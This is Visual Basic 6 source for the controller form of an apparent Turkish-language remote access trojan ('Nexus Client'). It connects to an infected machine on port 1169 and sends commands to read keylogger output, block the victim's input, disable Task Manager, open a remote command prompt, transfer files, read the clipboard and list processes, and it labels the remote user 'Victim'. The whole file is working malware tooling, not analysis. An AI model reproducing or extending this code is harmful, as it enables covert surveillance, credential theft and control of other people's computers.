VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Nexus Client Durum : Baðlantý Yok"
   ClientHeight    =   5925
   ClientLeft      =   6915
   ClientTop       =   4020
   ClientWidth     =   6945
   Icon            =   "client.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5925
   ScaleWidth      =   6945
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   3840
      Top             =   5640
   End
   Begin VB.CommandButton Command23 
      Caption         =   "Video Oynat"
      Height          =   375
      Left            =   4440
      TabIndex        =   32
      Top             =   5160
      Width           =   2175
   End
   Begin VB.TextBox Text5 
      Height          =   495
      Left            =   10440
      MultiLine       =   -1  'True
      TabIndex        =   30
      Top             =   240
      Width           =   1215
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H00000000&
      Caption         =   "Durum"
      ForeColor       =   &H0000FF00&
      Height          =   5535
      Left            =   6960
      TabIndex        =   29
      Top             =   120
      Width           =   2895
      Begin VB.TextBox Text6 
         Appearance      =   0  'Flat
         BackColor       =   &H80000007&
         ForeColor       =   &H0000FF00&
         Height          =   5175
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   31
         Top             =   240
         Width           =   2655
      End
   End
   Begin VB.CommandButton Command22 
      Caption         =   "Ýnterneti Kes"
      Height          =   375
      Left            =   2160
      TabIndex        =   28
      Top             =   5160
      Width           =   2175
   End
   Begin VB.CommandButton Command21 
      Caption         =   "Yazdýr"
      Height          =   375
      Left            =   360
      TabIndex        =   27
      Top             =   5160
      Width           =   1695
   End
   Begin VB.CommandButton Command20 
      Caption         =   "Clipboard"
      Height          =   375
      Left            =   4440
      TabIndex        =   26
      Top             =   4680
      Width           =   2175
   End
   Begin VB.CommandButton Command19 
      Caption         =   "Çalýþan Ýþlemleri Göster"
      Height          =   375
      Left            =   2160
      TabIndex        =   25
      Top             =   4680
      Width           =   2175
   End
   Begin VB.CommandButton Command18 
      Caption         =   "Programlar"
      Height          =   375
      Left            =   360
      TabIndex        =   24
      Top             =   4680
      Width           =   1695
   End
   Begin VB.CommandButton Command16 
      Caption         =   "BlockInput Aç"
      Height          =   375
      Left            =   4440
      TabIndex        =   21
      Top             =   4200
      Width           =   2175
   End
   Begin VB.CommandButton Command15 
      Caption         =   "Dosya Gönder"
      Height          =   375
      Left            =   2160
      TabIndex        =   20
      Top             =   4200
      Width           =   2175
   End
   Begin VB.CommandButton Command14 
      Caption         =   "Açýlýþ Yazýsý Ayarla"
      Height          =   375
      Left            =   360
      TabIndex        =   19
      Top             =   4200
      Width           =   1695
   End
   Begin VB.CommandButton Command13 
      Caption         =   "Server Yönetim"
      Height          =   375
      Left            =   2160
      TabIndex        =   18
      Top             =   3720
      Width           =   2175
   End
   Begin VB.CommandButton Command12 
      Caption         =   "Windows Yönetim"
      Height          =   375
      Left            =   360
      TabIndex        =   17
      Top             =   3720
      Width           =   1695
   End
   Begin VB.CommandButton Command35 
      Caption         =   "Keylogger Oku"
      Height          =   375
      Left            =   4440
      TabIndex        =   16
      Top             =   3240
      Width           =   2175
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Baþlat Deðiþ"
      Height          =   375
      Left            =   5400
      TabIndex        =   15
      Top             =   2160
      Width           =   1215
   End
   Begin VB.TextBox Text4 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   405
      Left            =   240
      TabIndex        =   14
      Text            =   "Baþlat Yazýsýný Yazýn"
      Top             =   2160
      Width           =   5055
   End
   Begin VB.CommandButton Command10 
      Caption         =   "CD-Rom Çýkar"
      Height          =   375
      Left            =   360
      TabIndex        =   13
      Top             =   3240
      Width           =   1695
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Maus Tuþlarýný Deðiþtir"
      Height          =   375
      Left            =   2160
      TabIndex        =   12
      Top             =   3240
      Width           =   2175
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Sohbet Penceresini Aç"
      Height          =   375
      Left            =   4440
      TabIndex        =   11
      Top             =   2760
      Width           =   2175
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Server Bul"
      Height          =   375
      Left            =   4080
      TabIndex        =   10
      Top             =   360
      Width           =   1215
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Komut Ýstemi"
      Height          =   375
      Left            =   4440
      TabIndex        =   9
      Top             =   3720
      Width           =   2175
   End
   Begin VB.CommandButton Command5 
      BackColor       =   &H00000000&
      Caption         =   "Görev Yöneticisi Kapat"
      Height          =   375
      Left            =   2160
      TabIndex        =   8
      Top             =   2760
      Width           =   2175
   End
   Begin VB.CommandButton Command4 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Ekraný Kapat"
      Height          =   375
      Left            =   360
      MaskColor       =   &H0000FF00&
      TabIndex        =   7
      Top             =   2760
      UseMaskColor    =   -1  'True
      Width           =   1695
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Server Bilgisi"
      Height          =   375
      Left            =   5400
      TabIndex        =   6
      Top             =   360
      Width           =   1215
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   240
      TabIndex        =   3
      Text            =   "Mesajý Yazýn"
      Top             =   1200
      Width           =   5055
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Mesaj Gönder"
      Height          =   375
      Left            =   5400
      TabIndex        =   4
      Top             =   1200
      Width           =   1215
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00000000&
      Caption         =   "Komutlar"
      ForeColor       =   &H0000FF00&
      Height          =   4695
      Left            =   120
      TabIndex        =   5
      Top             =   960
      Width           =   6735
      Begin VB.TextBox Text3 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         ForeColor       =   &H0000FF00&
         Height          =   375
         Left            =   120
         TabIndex        =   23
         Text            =   "Sesli Olarak Göndermek Ýstediðiniz Mesajý Yazýn"
         Top             =   720
         Width           =   5055
      End
      Begin VB.CommandButton Command17 
         Caption         =   "Sesli Gönder"
         Height          =   375
         Left            =   5280
         TabIndex        =   22
         Top             =   720
         Width           =   1215
      End
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   405
      Left            =   240
      TabIndex        =   1
      Text            =   "127.0.0.1"
      Top             =   360
      Width           =   2175
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Connect"
      Height          =   375
      Left            =   2520
      TabIndex        =   2
      Top             =   360
      Width           =   1455
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00000000&
      Caption         =   "Baðlantý"
      ForeColor       =   &H0000FF00&
      Height          =   735
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   6735
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   5880
      Top             =   3480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label2 
      BackColor       =   &H80000007&
      Caption         =   "http://<some-random-website>/"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   0
      TabIndex        =   34
      Top             =   5640
      Width           =   2655
   End
   Begin VB.Label Label1 
      BackColor       =   &H80000007&
      Caption         =   "Programmed by Nexus"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   255
      Left            =   4560
      TabIndex        =   33
      Top             =   5640
      Width           =   2415
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Sub Command1_Click()
On Error Resume Next
If Command1.Caption = "Connect" Then
Winsock1.Connect Text1.Text, 1169
Text1.Enabled = False
If Winsock1.State <> 7 Then
Command1.Caption = "Connect"
Text5.Text = Text5.Text & _
"Tarih : " & DateTime.Now & vbNewLine & Text1.Text & " Adresine Baðlanýldý" & vbNewLine & "----------------------------------------------------" & vbNewLine
Else
Command1.Caption = "Disconnect"

End If
ElseIf Command1.Caption = "Disconnect" Then
Winsock1.Close
Text1.Enabled = True
Command1.Caption = "Connect"
Me.Caption = "Nexus Client Durum : Baðlantý Kapatýldý " & "[" & Text1.Text & "]"
Text5.Text = Text5.Text & _
"Tarih : " & DateTime.Now & vbNewLine & Text1.Text & " Baðlantýsý Kapatýldý" & vbNewLine & "----------------------------------------------------" & vbNewLine
formlari_kapat
End If

End Sub

Public Sub baglan()
On Error Resume Next
If Command1.Caption = "Connect" Then
Winsock1.Connect Text1.Text, 1169
Text1.Enabled = False
If Winsock1.State <> 7 Then
Command1.Caption = "Connect"

Else
Command1.Caption = "Disconnect"
End If
ElseIf Command1.Caption = "Disconnect" Then
Winsock1.Close
Text1.Enabled = True
Command1.Caption = "Connect"
Me.Caption = "Nexus Client Durum : Baðlantý Kapatýldý " & "[" & Text1.Text & "]"
End If

End Sub

Private Sub Command10_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
If Command10.Caption = "CD-Rom Çýkar" Then
Command10.Caption = "CD-Rom Tak"
Winsock1.SendData "cd_ac"
ElseIf Command10.Caption = "CD-Rom Tak" Then
Command10.Caption = "CD-Rom Çýkar"
Winsock1.SendData "cd_kapat"
End If
End If
End Sub

Private Sub Command11_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Winsock1.SendData "baslat_yazisi|" + Text4.Text
End If
End Sub

Private Sub Command12_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Form5.Show
End If
'MsgBox "Bu Özellik Yapým Aþamasýndadýr!", vbCritical, "Client"
End Sub

Private Sub Command13_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Form6.Show
End If
End Sub

Private Sub Command14_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Form8.Show
Winsock1.SendData "acilis_ac"
End If
End Sub

Private Sub Command15_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
frmClient.Show
Winsock1.SendData "islem|" + "DOSYA TRANSFERÝ AÇILDI"
End If
End Sub

Private Sub Command16_Click()
On Error Resume Next
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
If Command16.Caption = "BlockInput Aç" Then
Winsock1.SendData "block_ac"
Command16.Caption = "BlockInput Kapat"
ElseIf Command16.Caption = "BlockInput Kapat" Then
Winsock1.SendData "block_kapat"
Command16.Caption = "BlockInput Aç"
End If
End If
End Sub

Private Sub Command17_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Winsock1.SendData "speec_oku|" + Text3.Text
End If
End Sub

Private Sub Command18_Click()
Form9.Show
End Sub

Private Sub Command19_Click()
'MsgBox "Özellik Yapým Aþamasýndadýr.", vbCritical, "Nexus's Client"
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Form10.Show
End If
End Sub

Private Sub Command2_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Winsock1.SendData "message|" + Text2.Text
End If
End Sub

Private Sub Command20_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Form12.Show
End If
End Sub

Private Sub Command21_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Form13.Show
End If
End Sub

Private Sub Command22_Click()
MsgBox "Özellik Yapým Aþamasýndadýr.", vbCritical, "Client Hata!"
'On Error Resume Next
'If Winsock1.State <> 7 Then
'MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
'Else
'Form14.Show
'End If
End Sub


Private Sub Command23_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
video_oynat.Show
End If
End Sub

Private Sub Command3_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Winsock1.SendData "bilgiyolla"
End If
End Sub


Private Sub Command35_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Winsock1.SendData "keylog_gonder"
Form4.Show
End If
End Sub

Private Sub Command4_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Form11.Show
'If Command4.Caption = "Ekraný Kapat" Then
'Winsock1.SendData "ekran_kapat"
'Command4.Caption = "Ekraný Aç"
'ElseIf Command4.Caption = "Ekraný Aç" Then
'Winsock1.SendData "ekran_ac"
'Command4.Caption = "Ekraný Kapat"
'End If
End If
End Sub

Private Sub Command5_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
If Command5.Caption = "Görev Yöneticisi Kapat" Then
Winsock1.SendData "disable_taskmgr"
Command5.Caption = "Görev Yöneticisi Aç"
ElseIf Command5.Caption = "Görev Yöneticisi Aç" Then
Winsock1.SendData "enable_taskmgr"
Command5.Caption = "Görev Yöneticisi Kapat"
End If
End If
End Sub

Private Sub Command6_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
Winsock1.SendData "islem|" + "MSDOS KOMUTLARI AÇILDI."
Form7.Show
End If
End Sub

Private Sub Command7_Click()
On Error Resume Next
server_bul.Show
End Sub

Private Sub Command8_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
If Command8.Caption = "Sohbet Penceresini Aç" Then
Winsock1.SendData "chat_ac"
Form3.Show
Command8.Caption = "Sohbet Penceresini Kapat"
ElseIf Command8.Caption = "Sohbet Penceresini Kapat" Then
Unload Form3
Winsock1.SendData "chat_kapat"
Command8.Caption = "Sohbet Penceresini Aç"
End If
End If
End Sub

Private Sub Command9_Click()
On Error Resume Next
If Winsock1.State <> 7 Then
MsgBox "Hata : Baðlantý Bulunamadý!", vbCritical, "Client Hata!"
Else
If Command9.Caption = "Maus Tuþlarýný Deðiþtir" Then
Command9.Caption = "Maus Tuþlarýný Düzelt"
Winsock1.SendData "maus_ac"
ElseIf Command9.Caption = "Maus Tuþlarýný Düzelt" Then
Command9.Caption = "Maus Tuþlarýný Deðiþtir"
Winsock1.SendData "maus_kapat"
End If
End If
End Sub




Private Sub Form_Load()
Text5.Visible = False
Frame3.Visible = False
Text6.Visible = False
Text5.Text = Text5.Text & _
"Tarih : " & DateTime.Now & vbNewLine & "Client Açýldý" & vbNewLine & "----------------------------------------------------" & vbNewLine
End Sub

Private Sub Form_Unload(Cancel As Integer)
Winsock1.Close
form_kapandi
End Sub

Public Sub form_kapandi()
'loading.Label1.Caption = "Kapatýlýyor..."
'loading.Timer1.Enabled = False
'loading.Text1.Text = 0
'loading.Timer2.Enabled = True
'loading.Show
formlari_kapat
hakkinda_2.Show
End Sub

Public Sub formlari_kapat()
Unload Form2
Unload Form3
Unload Form4
Unload Form5
Unload Form6
Unload Form7
Unload Form8
Unload Form9
Unload Form10
Unload Form11
Unload Form12
Unload Form13
Unload Form14
Unload frmClient
Unload hakkinda
Unload loading
Unload server_bul
Unload web_tarayýcý
Unload video_oynat
End Sub

Private Sub Text2_Click()
Text2.Text = ""
End Sub

Private Sub Text3_Click()
Text3.Text = ""
End Sub

Private Sub Timer1_Timer()
If Label1.ForeColor = vbGreen Then
Label1.ForeColor = vbRed
Else
Label1.ForeColor = vbGreen
End If
If Label2.ForeColor = vbRed Then
Label2.ForeColor = vbGreen
Else
Label2.ForeColor = vbRed
End If
End Sub

Private Sub Text5_Change()
Text6.Text = Text5.Text
End Sub

Private Sub Text6_Change()
Text6.Text = Text5.Text
End Sub

Private Sub Winsock1_Close()
Text1.Enabled = True
Winsock1.Close
Me.Caption = "Nexus Client Durum : Baðlantý Kapatýldý " & "[" & Text1.Text & "]"
Command1.Caption = "Connect"
server_bul.Command2.Caption = "Baðlan"
formlari_kapat
End Sub

Private Sub Winsock1_Connect()
Text1.Enabled = False
Me.Caption = "Nexus Client Durum : Baðlantý Kuruldu " & "[" & Text1.Text & "]"
Command1.Caption = "Disconnect"
server_bul.Command2.Caption = "Baðlantýyý Kes"
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim receive As String
Dim Vector() As String
Winsock1.GetData receive
Vector() = Split(receive, "|")
Select Case Vector(0)
Case "bilgi"
MsgBox Vector(1), vbInformation, "Server Hakýnda"
Winsock1.SendData "islem|" + "SERVER BÝLGÝSÝ YOLLANDI"
Case "keylog"
Form4.Text2.Text = Vector(1)
Case "acilis_baslik_ok"
Form8.Text1.Text = Vector(1)
Case "acilis_mesaj_ok"
Form8.Text2.Text = Vector(1)
Case "chat_client"
Form3.List1.AddItem "Victim : " & Vector(1)
Beep
End Select
Form10.List1.AddItem receive
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Winsock1.Close
Me.Caption = "Nexus Client Durum : HATA! Baðlantý Bulunamadý " & "[" & Text1.Text & "]"
Text1.Enabled = True
formlari_kapat
End Sub
